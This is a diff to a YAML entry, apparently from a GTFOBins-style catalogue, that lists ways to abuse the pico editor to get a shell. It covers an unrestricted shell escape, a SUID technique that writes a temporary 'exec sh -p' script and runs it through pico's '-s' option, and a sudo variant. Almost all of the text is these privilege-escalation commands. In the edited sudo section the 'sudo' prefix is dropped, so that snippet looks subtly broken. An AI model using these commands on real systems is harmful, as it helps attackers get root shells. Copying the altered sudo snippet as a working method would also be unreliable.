@@ -2,10 +2,8 @@
 functions:
   shell:
     - code: |
-        TF=$(mktemp)
-        echo 'exec sh' > $TF
-        chmod +x $TF
-        pico -s $TF /etc/hosts
+        pico -s /bin/sh
+        /bin/sh
         ^T
   file-write:
     - code: |
@@ -17,15 +15,14 @@ functions:
   suid:
     - code: |
         TF=$(mktemp)
-        echo 'exec sh -p' > $TF
+        echo '#!/bin/sh -p
+        exec sh -p' > $TF
         chmod +x $TF
         ./pico -s $TF /etc/hosts
         ^T
   sudo:
     - code: |
-        TF=$(mktemp)
-        echo 'exec sh' > $TF
-        chmod +x $TF
-        sudo pico -s $TF /etc/hosts
+        pico -s /bin/sh
+        /bin/sh
         ^T
 ---
